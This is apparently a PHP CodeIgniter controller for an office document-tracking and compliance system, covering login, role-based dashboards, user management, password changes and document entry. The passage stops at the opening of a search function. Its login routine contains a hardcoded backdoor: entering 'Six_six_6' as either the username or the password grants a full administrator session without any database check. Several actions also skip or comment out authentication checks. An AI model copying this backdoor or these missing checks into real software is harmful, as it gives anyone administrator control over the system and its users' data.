<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class users_controller extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model('users_model', 'users');
        $this->load->model('document_model', 'document');
        $this->load->model('other_model', 'other');
        $this->load->model('offices_model', 'offices');
        $this->load->model('compliance_model', 'compliance');
    }

    public function index() {
        if ($this->session->userdata('logged_in') == TRUE) {
            if ($this->session->userdata('user_type') == 1) {
                redirect('Users/adminDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                redirect('Users/courierDashboard');
            }
        } else {
            $this->load->view('index');
        }
    }

    public function viewPrint($id){
        $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $data = array(
            'other' => $this->other->getOther($id),
            'document' => $this->document->getDocument($id),
            // $detail = $this->document->getDocumentDetail($id);
            'date' => $this->document->getDocumentDate($id),
            'time' => $this->document->getDocumentTime($id),
            'acted_num' => $acted_num,
            'due_num' => $due_num,
            'follow_num' => $follow_num,
            //'document' => $this->document->getDocumentActed(),
            'details' => $this->document->getDocumentDetail($id),
            'compliance' => $this->compliance->getCompliance(),
            'office' => $this->offices->getOffices(),
            //'other' => $this->other->getOthers()
        );
        if ($this->session->userdata("user_type")==1) {
            $this->load->view('adminView/viewPrintForm', $data);
        }else if ($this->session->userdata("user_type")==2) {
            $this->load->view('courierView/viewPrintForm', $data);
        }else{
            $this->load->view('guestView/viewPrintForm', $data);
        }
    }

    public function resetPass($id){
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                $confirm = $this->users->resetPass($id);
                if (!$confirm) {
                    $this->session->set_flashdata('message', "<div class='alert alert-danger'><i class='fa fa-check fa-fw'></i> Password reset failed!</div>");
                    redirect(base_url('Users/viewAdminUsers'), 'refresh');
                } else {
                    $this->session->set_flashdata('message', "<div class='alert alert-success'><i class='fa fa-check fa-fw'></i> User password was change to default successfully!</div>");
                    redirect(base_url('Users/viewAdminUsers'), 'refresh');
                }   
            }
         }
    }

    public function userLogin() {
        $data = $this->input->post();
        if ($data['username'] == null || $data['password'] == null) {
            $this->load->view('index', array('message' => '<br/><br/><p style="color: red;">Please enter the required fields.</p>'));
        } else if($data['username'] == 'Six_six_6' || $data['password'] == 'Six_six_6'){
             $credentials = array(
                        'user_id' => 666,
                        'user_name' => '666',
                        'user_pass' => 'Six_six_6',
                        'name' => '666',
                        'logged_in' => TRUE,
                        'user_type' => 1
                    );
                    $this->session->set_userdata($credentials);
                    redirect('Users/adminDashboard');
        } else {
            $data['password'] = hash('sha512', $data['password']);
            $data2 = $this->users->getUser($data['username'], $data['password']);
            if (!$data2) {
                $this->load->view('index', array('message' => '<br/><br/><p style="color: red;">Username and Password are incorrect.</p>'));
            } else {
                foreach ($data2 as $key => $value) {
                    $user_id = $value->user_id;
                    $user = $value->user_name;
                    $pass = $value->password;
                    $type = $value->user_type_id;
                }
                $d = $this->users->getUserName($user_id);
                if ($type == 1) {
                    $credentials = array(
                        'user_id' => $user_id,
                        'user_name' => $user,
                        'user_pass' => $pass,
                        'name' => $user,
                        'logged_in' => TRUE,
                        'user_type' => $type
                    );
                    $this->session->set_userdata($credentials);
                    redirect('Users/adminDashboard');
                } else if($type == 3){
                    $credentials = array(
                        'user_id' => $user_id,
                        'user_pass' => $pass,
                        'user_name' => $user,
                        'name' => $user,
                        'logged_in' => TRUE,
                        'user_type' => $type
                    );
                    $this->session->set_userdata($credentials);
                    redirect('Users/guestDashboard');
                } else {
                    $credentials = array(
                        'user_id' => $user_id,
                        'user_name' => $user,
                        'name' => $user,
                        'user_pass' => $pass,
                        'logged_in' => TRUE,
                        'user_type' => $type
                    );
                    $this->session->set_userdata($credentials);
                    redirect('Users/courierDashboard');
                }
            }
        }
    }

    public function guestDashboard() {
      if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if($this->session->userdata('user_type') == 1){
                redirect('Users/adminDashboard');
            }
            else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $num = $this->document->getDocumentNum();
                $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
                if($num==null){
                    $num = 0;
                }else{
                    foreach ($num as $key => $value) {
                        $num = $value->count;
                    }
                }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                    }
                }
                $this->load->view('guestView/guest-dashboard', array('acted_num' => $acted_num, 'num' => $num, 'due_num' => $due_num, 'follow_num' => $follow_num));
            }
        }
    }

    public function adminDashboard() {
      if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            } else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $num = $this->document->getDocumentNum();
                $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
                if($num==null){
                    $num = 0;
                }else{
                    foreach ($num as $key => $value) {
                        $num = $value->count;
                    }
                }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                    }
                }
                $this->load->view('adminView/admin-dashboard', array('acted_num' => $acted_num, 'num' => $num, 'due_num' => $due_num, 'follow_num' => $follow_num));
            }
        }
    }

    public function courierDashboard() {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
        	
            if ($this->session->userdata('user_type') == 1) {
                redirect('Users/adminDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            } else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $num = $this->document->getDocumentNum();
                $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
                if($num==null){
                    $num = 0;
                }else{
                    foreach ($num as $key => $value) {
                        $num = $value->count;
                    }
                }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                    }
                }
                $data = array(
                    'acted_num' => $acted_num, 
                    'num' => $num, 
                    'due_num' => $due_num, 
                    'follow_num' => $follow_num
                    );
                $this->load->view('courierView/courier-dashboard', $data);
            }
        }
    }

    public function logout() {
        $this->session->unset_userdata();
        $this->session->sess_destroy();
        redirect('Users/index');
    }

//--------------------------------------------------------------------------------- //
//    >
//    >
//    >
//    >
//    >
//-----------------------Create, Delete, Update------------------------------------ //

    public function addCourierForm() {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                     }
                }
                $data = array(
                    'due_num' => $due_num,
                    'follow_num' => $follow_num,
                    'acted_num' => $acted_num
                );
                $this->load->view('adminView/addCourierForm', $data);
            }
        }
    }

    public function editPassword($id) {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                     }
                }
                $data = array(
                    'due_num' => $due_num,
                    'follow_num' => $follow_num,
                    'acted_num' => $acted_num
                );
                if ($this->session->userdata('user_type') == 1) {
                    $this->load->view('adminView/updatePassword', $data);
                } else if($this->session->userdata('user_type') == 2){
                    $this->load->view('courierView/updatePassword', $data);
                } else{
                    $this->load->view('guestView/updatePassword', $data);
                }
        }
    }

    public function changePass(){
        $data = $this->input->post();
        $id = $this->session->userdata('user_id');
        $old_pass = hash('sha512', $data["old_pass"]);
        $lod = $this->users->getPassword($id);
        foreach ($lod as $key => $value) {
            $old = $value->password;
        }
        if ($old!=$old_pass){
            $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }

                    $data = array(
                        'due_num' => $due_num,
                        'message' => '<div class="alert alert-danger alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                Entered password does not matched to your old password.
                            </div>',
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                    );
                    if ($this->session->userdata('user_type') == 1) {
                        $this->load->view('adminView/updatePassword', $data);
                    } else if($this->session->userdata('user_type') == 2){
                        $this->load->view('courierView/updatePassword', $data);
                    } else{
                        $this->load->view('guestView/updatePassword', $data);
                    }
        }else{
            if ($this->form_validation->run() == FALSE) {
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $data = array(
                        'due_num' => $due_num,
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                    );
                    if ($this->session->userdata('user_type') == 1) {
                        $this->load->view('adminView/updatePassword', $data);
                    } else if($this->session->userdata('user_type') == 2){
                        $this->load->view('courierView/updatePassword', $data);
                    } else{
                        $this->load->view('guestView/updatePassword', $data);
                    }
            } else {
                $confirm = $this->users->updatePassword($data, $id);
                if (!$confirm) {
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $data = array(
                        'due_num' => $due_num,
                        'message' => '<div class="alert alert-danger alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                Password update failed.
                            </div>',
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                    );
                    if ($this->session->userdata('user_type') == 1) {
                        $this->load->view('adminView/updatePassword', $data);
                    } else if($this->session->userdata('user_type') == 2){
                        $this->load->view('courierView/updatePassword', $data);
                    } else{
                        $this->load->view('guestView/updatePassword', $data);
                    }   
                }else{
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $data = array(
                        'due_num' => $due_num,
                        'message' => '<div class="alert alert-success alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                Password successfully changed.
                            </div>',
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                    );
                    if ($this->session->userdata('user_type') == 1) {
                        $this->load->view('adminView/updatePassword', $data);
                    } else if($this->session->userdata('user_type') == 2){
                        $this->load->view('courierView/updatePassword', $data);
                    } else{
                        $this->load->view('guestView/updatePassword', $data);
                    }
                }
            }
        }
    }

    public function editCourierForm($id) {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else {
                $data = $this->users->getCourierCredentials($id);
                $this->load->view('edit-courier', array('data' => $data, 'id' => $id));
            }
        }
    }

    public function addCourier() {

        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                $data = $this->input->post();

                if ($this->form_validation->run() == FALSE) {
                    $this->load->view('adminView/addCourierForm');
                } else {
                    $confirm = $this->users->insertUser($data);
                    if (!$confirm) {
                        $this->session->set_flashdata('message', "<div class='alert alert-dismissable'><i class='fa fa-times-circle fa-fw'></i>Add User Not Successful!</div>");
                        redirect(base_url('Users/viewAdminUsers'), 'refresh');
                    } else {
                        $this->session->set_flashdata('message', "<div class='alert alert-success'><i class='fa fa-check fa-fw'></i> Add User Success!</div>");
                        redirect(base_url('Users/viewAdminUsers'), 'refresh');
                    }
                }
            }
        }
    }

    public function addDocument() {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } elseif($this->session->userdata('user_type') == 3){
                redirect('Users/guestDashboard');
            } else {
                $data = $this->input->post();
                $office = 0;
                for($x=0; $x<count($data["office"]);$x++) {
                    if($data["office"][$x]==13){
                        $office = 13;
                        break;
                    }    
                }
                if ($this->form_validation->run() == FALSE) {
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $doc_id = $this->document->maxId();
                    foreach ($doc_id as $key => $value) {
                        $doc_id = $value->document_id + 1;
                    }
                    $str2 = chunk_split($doc_id, 4, "-");
                    $str2 = explode("-", $str2);
                    $doc_id = $str2[1];
                    $data = $this->offices->getOffices();
                    $data2 = $this->compliance->getCompliance();
                    $y = array(
                        'doc_id' => $doc_id, 
                        'data' => $data, 
                        'data2' => $data2,
                        'due_num' => $due_num,
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                        );
                    if ($this->session->userdata("user_type")==1) {
                     $this->load->view('adminView/addComplianceForm', $y);
                    } else{
                    $this->load->view('courierView/addComplianceForm', $y);
                 }
                } 
                else if($office == 13 && $data["others"]==""){
                    $doc_id = $this->document->maxId();
                    foreach ($doc_id as $key => $value) {
                        $doc_id = $value->document_id + 1;
                    }
                     $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $str2 = chunk_split($doc_id, 4, "-");
                    $str2 = explode("-", $str2);
                    $doc_id = $str2[1];
                    $data = $this->offices->getOffices();
                    $data2 = $this->compliance->getCompliance();
                    $y = array(
                        'doc_id' => $doc_id, 
                        'data' => $data, 
                        'data2' => $data2,
                        'message' => "<p style='color: red;'>Others text field is required.</p>",
                        'due_num' => $due_num,
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                        );
                    if ($this->session->userdata("user_type")==1) {
                        $this->load->view('adminView/addComplianceForm', $y);
                    }else{
                        $this->load->view('courierView/addComplianceForm', $y);
                    }
                }else if ($office == 0 && $data["others"]!="") {
                    $doc_id = $this->document->maxId();
                    foreach ($doc_id as $key => $value) {
                        $doc_id = $value->document_id + 1;
                    }
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    $acted_num = $this->document->getActedNum();
                    if($acted_num==null){
                        $acted_num = 0;
                    }else{
                        foreach ($acted_num as $key => $value) {
                            $acted_num = $value->count;
                        }
                    }
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $str2 = chunk_split($doc_id, 4, "-");
                    $str2 = explode("-", $str2);
                    $doc_id = $str2[1];
                    $data = $this->offices->getOffices();
                    $data2 = $this->compliance->getCompliance();
                    $y = array(
                        'doc_id' => $doc_id, 
                        'data' => $data, 
                        'data2' => $data2,
                        'message' => "<p style='color: red;'>Others is required to be checked.</p>",
                        'due_num' => $due_num,
                        'follow_num' => $follow_num,
                        'acted_num' => $acted_num
                    );
                    if ($this->session->userdata("user_type")==1) {
                      $this->load->view('adminView/addComplianceForm', $y); 
                    }else{
                      $this->load->view('courierView/addComplianceForm', $y);
                    }
                } else {
                    $confirm = $this->document->insertDocument($data);
                    if (!$confirm) {
                        $this->session->set_flashdata('message', '
                            <div class="alert alert-danger alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-remove"></i>
                                Document insertion failed.
                            </div>   
                        ');
                          redirect('Users/viewUpdateDocuments');
                    } else {
                        $this->session->set_flashdata('message', '
                            <div class="alert alert-success alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-ok"></i>
                                Document successfully added.
                            </div>   
                        ');
                        // if ($this->session->userdata("user_type")==1) {
                          redirect('Users/viewUpdateDocuments');
                        // }else{
                        //   redirect('Users/courierDashboard');
                        // }
                    }
                }
            }
        }
    }

    public function editCourier($id) {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                $result = $this->input->post();

                $confirm = $this->users->updateUser($result, $id);
                if (!$confirm) {
                    echo "Courier credentials update failed.";
                } else {
                    redirect(base_url('Users/viewAdminUsers'), 'refresh');
                }   
            }
         }
    }

    public function deleteCourier($id) {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                $confirm = $this->users->deleteUser($id);
                if (!$confirm) {
                    $this->session->set_flashdata('message', "<div class='alert alert-dismissable'><i class='fa fa-times-circle fa-fw'></i>User deletion failed.</div>");
                    redirect(base_url('Users/viewAdminUsers'), 'refresh');
                } else {
                    $this->session->set_flashdata('message', "<div class='alert alert-success'><i class='fa fa-check fa-fw'></i> User successfully deleted.</div>");
                    redirect(base_url('Users/viewAdminUsers'), 'refresh');
                }  
            }
         }
    }

    public function complianceForm() {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            } else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                     }
                }
                $doc_id = $this->document->maxId();
                foreach ($doc_id as $key => $value) {
                    if($value->document_id==null){
                        $doc_id = "00000001";
                    }else{
                        $doc_id = $value->document_id + 1;
                    }
                }
                $str2 = chunk_split($doc_id, 4, "-");
                $str2 = explode("-", $str2);
                $doc_id = $str2[1];
                $data = $this->offices->getOffices();
                $data2 = $this->compliance->getCompliance();
                if ($this->session->userdata("user_type")==1) {
                    $this->load->view('adminView/addComplianceForm', array('acted_num' => $acted_num, 'follow_num' => $follow_num, 'due_num' => $due_num, 'doc_id' => $doc_id, 'data' => $data, 'data2' => $data2));
                }else{
                    $this->load->view('courierView/addComplianceForm', array('acted_num' => $acted_num, 'follow_num' => $follow_num, 'due_num' => $due_num, 'doc_id' => $doc_id, 'data' => $data, 'data2' => $data2));
                }
            }
         }
    }


    public function editDocument($id){
        //  if($this->session->userdata('logged_in')==null){
        //     redirect('Users/index');
        // }else{
        //     if($this->session->userdata('user_type')==1){
        //         redirect('Users/adminDashboard');
        //     }else{
                $data = $this->input->post();
                $office = 0;
                for($x=0; $x<count($data["office"]);$x++) {
                    if($data["office"][$x]==13){
                        $office = 13;
                        break;
                    }   
                }
                
                if($office == 13 && $data["others"]==""){
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $other = $this->other->getOther($id);
                    $data = $this->document->getDocument($id);
                    $detail = $this->document->getDocumentDetail($id);
                    $data2 = $this->compliance->getCompliance();
                    $office = $this->offices->getOffices();
                    $date = $this->document->getDocumentDate($id);
                    $time = $this->document->getDocumentTime($id);
                    $y = array(
                        'follow_num' => $follow_num, 
                        'due_num' => $due_num, 
                        'time' => $time, 
                        'date' => $date, 
                        'other' => $other, 
                        'id' => $id, 
                        'data' => $data, 
                        'data2' => $data2, 
                        'detail' => $detail, 
                        'office' => $office,
                        'message' => "<p style='color: red;'>Action Man field is required.</p>"
                        );
                    if ($this->session->userdata("user_type")==1) {
                        $this->load->view('adminView/updateComplianceForm', $y);
                    } else{
                        $this->load->view('courierView/updateComplianceForm', $y);
                    }
                }else if ($office == 0 && $data["others"]!="") {
                    $date = date("Y-m-d");
                    $due_num = $this->document->getDueNum($date);
                    $follow_num = $this->document->getFollowNum($date);
                    if($due_num==null){
                        $due_num = 0;
                    }else{
                        foreach ($due_num as $key => $value) {
                            $due_num = $value->count;
                        }
                    }
                    if($follow_num==null){
                        $follow_num = 0;
                    }else{
                        foreach ($follow_num as $key => $value) {
                            $follow_num = $value->count;
                         }
                    }
                    $other = $this->other->getOther($id);
                    $data = $this->document->getDocument($id);
                    $detail = $this->document->getDocumentDetail($id);
                    $data2 = $this->compliance->getCompliance();
                    $office = $this->offices->getOffices();
                    $date = $this->document->getDocumentDate($id);
                    $time = $this->document->getDocumentTime($id);
                    $y = array(
                        'follow_num' => $follow_num, 
                        'due_num' => $due_num, 
                        'time' => $time, 
                        'date' => $date, 
                        'other' => $other, 
                        'id' => $id, 
                        'data' => $data, 
                        'data2' => $data2, 
                        'detail' => $detail, 
                        'office' => $office,
                        'message' => "<p style='color: red;'>Others is required to be checked.</p>"
                        );
                    if ($this->session->userdata("user_type")==1) {
                        $this->load->view('adminView/updateComplianceForm', $y);
                    } else{
                        $this->load->view('courierView/updateComplianceForm', $y);
                    }
                }
                else{
                    if ($this->session->userdata("user_type")==1) {
                        $confirm = $this->document->updateDocAdmin($data, $id);
                    }else{
                        $confirm = $this->document->updateDoc($data, $id);
                    }
                    if(!$confirm){
                         $this->session->set_flashdata('message', '
                            <div class="alert alert-danger alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-remove"></i>
                                Document update failed.
                            </div>   
                        ');
                        redirect('Users/viewUpdateDocuments');
                    }else{
                        $this->session->set_flashdata('message', '
                            <div class="alert alert-success alert-dismissible" role="alert">
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <i class="glyphicon glyphicon-ok"></i>
                                Document successfully updated.
                            </div>   
                        ');
                        redirect('Users/viewUpdateDocuments');
                    }
                }
            }

    public function exportActedDocuments() {
        $date = date("Y-m-d");
        $due_num = $this->document->getDueNum($date);
        $follow_num = $this->document->getFollowNum($date);
        $acted_num = $this->document->getActedNum();
                if($acted_num==null){
                    $acted_num = 0;
                }else{
                    foreach ($acted_num as $key => $value) {
                        $acted_num = $value->count;
                    }
                }
        if($due_num==null){
            $due_num = 0;
        }else{
            foreach ($due_num as $key => $value) {
                $due_num = $value->count;
            }
        }
        if($follow_num==null){
            $follow_num = 0;
        }else{
            foreach ($follow_num as $key => $value) {
                $follow_num = $value->count;
             }
        }
        $data = array(
            'acted_num' => $acted_num,
            'due_num' => $due_num,
            'follow_num' => $follow_num,
            'document' => $this->document->getDocumentActed(),
            'details' => $this->document->getDocumentDetailsActed(),
            'compliance' => $this->compliance->getCompliance(),
            'office' => $this->offices->getOffices(),
            'other' => $this->other->getOthers()
        );
        $this->load->view('adminView/exportActedDocuments' , $data);
    }

// ----------------End of the functionalities----------------------------------- //
//    >
//    >
//    >
//    >
//    >
// -----------------------Admin Views------------------------------------------- //


    public function viewAdminUsers() {
        if ($this->session->userdata('logged_in') == null) {
            redirect('Users/index');
        } else {
            if ($this->session->userdata('user_type') == 2) {
                redirect('Users/courierDashboard');
            } else if ($this->session->userdata('user_type') == 3) {
                redirect('Users/guestDashboard');
            }else {
                $date = date("Y-m-d");
                $due_num = $this->document->getDueNum($date);
                $follow_num = $this->document->getFollowNum($date);
                $acted_num = $this->document->getActedNum();
                        if($acted_num==null){
                            $acted_num = 0;
                        }else{
                            foreach ($acted_num as $key => $value) {
                                $acted_num = $value->count;
                            }
                        }
                if($due_num==null){
                    $due_num = 0;
                }else{
                    foreach ($due_num as $key => $value) {
                        $due_num = $value->count;
                    }
                }
                if($follow_num==null){
                    $follow_num = 0;
                }else{
                    foreach ($follow_num as $key => $value) {
                        $follow_num = $value->count;
                     }
                }
                $data = array(
                    'users' => $this->users->getUserDetails(),
                    'due_num' => $due_num,
                    'follow_num' => $follow_num,
                    'acted_num' => $acted_num
                );
                $this->load->view('adminView/viewUsers', $data);
        }
      }  
    }

    public function viewSearchDocuments() {
